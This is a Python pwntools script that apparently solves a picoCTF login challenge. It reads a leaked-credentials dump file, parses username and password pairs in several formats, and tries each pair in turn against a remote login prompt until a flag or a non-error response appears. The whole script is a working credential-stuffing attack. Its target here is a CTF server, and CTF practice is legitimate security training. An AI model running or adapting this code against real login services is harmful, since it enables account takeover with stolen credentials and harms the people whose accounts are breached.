#!/usr/bin/env python3
from pwn import *
import re

HOST = "crystal-peak.picoctf.net"
PORT = 64198
DUMP = "creds-dump.txt"

context.log_level = "error"

def parse_creds(path):
    creds = []

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            low = line.lower()
            if "username" in low and "password" in low:
                continue

            user = pw = None

            if ":" in line:
                user, pw = line.split(":", 1)
            elif "," in line:
                user, pw = line.split(",", 1)
            elif ";" in line:
                user, pw = line.split(";", 1)
            elif "\t" in line:
                parts = line.split("\t")
                if len(parts) >= 2:
                    user, pw = parts[0], parts[1]
            else:
                parts = line.split()
                if len(parts) >= 2:
                    user, pw = parts[0], parts[1]

            if user is not None and pw is not None:
                user = user.strip().strip('"')
                pw = pw.strip().strip('"')
                if user and pw:
                    creds.append((user, pw))

    return creds

def try_login(user, pw):
    io = remote(HOST, PORT, timeout=5)
    io.recvuntil(b"Username:")
    io.sendline(user.encode())
    io.recvuntil(b"Password:")
    io.sendline(pw.encode())
    out = io.recvrepeat(1.5).decode(errors="ignore")
    io.close()
    return out

def main():
    creds = parse_creds(DUMP)
    print(f"[+] Loaded {len(creds)} credentials")

    for i, (user, pw) in enumerate(creds, 1):
        try:
            print(f"[{i}/{len(creds)}] Trying {user}:{pw}")
            resp = try_login(user, pw)
            low = resp.lower()

            if "picoctf{" in low:
                print("\n[+] FLAG FOUND")
                m = re.search(r"(picoCTF\{.*?\})", resp, re.IGNORECASE | re.DOTALL)
                print(m.group(1) if m else resp)
                return

            if "invalid username or password" not in low:
                print(f"\n[+] Possible valid credentials: {user}:{pw}")
                print(resp)
                return

        except Exception as e:
            print(f"[-] Error for {user}:{pw} -> {e}")

    print("[-] No valid creds found")

if __name__ == "__main__":
    main()
